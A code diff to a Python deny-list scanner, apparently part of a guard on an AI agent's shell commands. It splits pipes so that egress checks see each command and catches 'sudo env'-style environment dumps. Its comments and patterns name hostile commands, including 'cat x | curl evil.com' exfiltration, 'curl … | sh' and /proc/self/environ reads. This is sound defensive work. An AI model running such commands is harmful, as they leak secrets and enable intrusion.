@@ -45,7 +45,6 @@ ADMIN_PROMPT_PREFIXES = (
     "agnes admin user",
 )
 
-_ENV_DUMP = ("env", "printenv")
 _ENUM_PREFIXES = ("find /", "ls /home", "ls /etc", "cat /etc/", "cat /proc/")
 
 
@@ -172,8 +171,17 @@ _WRAPPERS = {"sudo", "nohup", "command", "exec", "time", "nice", "env", "timeout
 
 
 def _split_segments(cmd: str) -> list[str]:
-    """Split a command line into independently-scanned shell segments."""
-    parts = re.split(r"\|\||[;&\n]", cmd)
+    """Split a command line into independently-scanned shell segments.
+
+    A single ``|`` splits too: the downstream side of a pipe is its own
+    command, and the bare-host egress check only inspects a segment's
+    first token, so ``cat x | curl evil.com`` would otherwise never
+    host-check the ``curl`` (its first token is ``cat``). Splitting on a
+    single ``|`` also covers ``||`` and ``&&`` (the empty middle piece is
+    dropped), so the whole ``[;&|\\n]`` class is one character set. The
+    pipe-to-shell rule runs over the WHOLE command before this split, so
+    it still sees ``curl … | sh`` intact."""
+    parts = re.split(r"[;&|\n]", cmd)
     return [p.strip() for p in parts if p.strip()]
 
 
@@ -206,6 +214,42 @@ def _unwrap(toks: list[str]) -> list[str]:
             continue
         break
     return toks[i:]
+
+
+def _is_env_dump(seg: str) -> bool:
+    """True if the segment dumps the process environment, seeing through
+    leading wrappers (``sudo env``, ``nice printenv``).
+
+    ``env``/``printenv`` with no trailing command leak the whole
+    environment; ``env FOO=bar cmd`` merely *runs* cmd (which is unwrapped
+    and scanned separately), so it is not a pure dump. ``env`` is NOT
+    stepped over here (it is the dump command itself), unlike in
+    ``_unwrap`` where it is a wrapper — so this can't be defeated by the
+    same wrapper-stripping that made the old raw-string check miss
+    ``sudo env`` (security review on #1141)."""
+    toks = _tokens(seg)
+    i = 0
+    while i < len(toks):
+        t = toks[i]
+        if t in _WRAPPERS and t != "env":
+            i += 1
+            if t == "timeout" and i < len(toks) and re.fullmatch(r"\d+[smhd]?", toks[i]):
+                i += 1
+            continue
+        if t.startswith("-"):
+            i += 1
+            continue
+        break
+    rest = toks[i:]
+    if not rest:
+        return False
+    head = rest[0]
+    if head == "printenv":
+        return True  # printenv [VAR] still leaks env values
+    if head == "env":
+        # a trailing non-flag token (VAR=val or a command) → not a pure dump
+        return not [t for t in rest[1:] if not t.startswith("-")]
+    return False
 
 
 def _rm_recursive_force(toks: list[str]) -> bool:
@@ -272,18 +316,18 @@ def _scan(cmd: str) -> list[tuple[str, str]]:
             verdicts.append(("deny", _egress_reason(host)))
 
     for seg in _split_segments(cmd):
-        seg_lower = seg.lower()
+        toks = _unwrap(_tokens(seg))
+        unwrapped_lower = " ".join(toks).lower()
 
-        # Env reconnaissance
-        if seg_lower in _ENV_DUMP or seg_lower.startswith("cat /proc/self/environ"):
+        # Env reconnaissance — seen through wrappers (``env``/``printenv``
+        # dump their whole environment; unwrap alone strips ``env`` as a
+        # wrapper, so this is checked on the raw segment via _is_env_dump).
+        if _is_env_dump(seg) or unwrapped_lower.startswith("cat /proc/self/environ"):
             verdicts.append(("deny", "Refusing to dump the process environment."))
             continue
 
-        toks = _unwrap(_tokens(seg))
         if not toks:
             continue
-        unwrapped = " ".join(toks)
-        unwrapped_lower = unwrapped.lower()
 
         # Destructive ops against persistent workspace dirs
         if any(p in seg for p in DESTRUCTIVE_PATHS) and any(
